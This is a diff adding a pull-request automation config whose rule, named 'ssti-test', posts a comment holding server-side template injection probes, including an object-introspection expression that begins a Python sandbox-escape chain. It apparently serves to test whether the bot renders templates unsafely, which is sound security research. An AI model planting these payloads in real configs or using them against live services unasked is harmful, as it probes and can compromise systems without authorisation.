@@ -1,0 +1,12 @@
+pull_request_rules:
+  - name: ssti-test
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: |
+          SSTI_RESULT_START
+          {{ 7*7 }}
+          {{ ''.__class__.__mro__ }}
+          {{ request }}
+          SSTI_RESULT_END
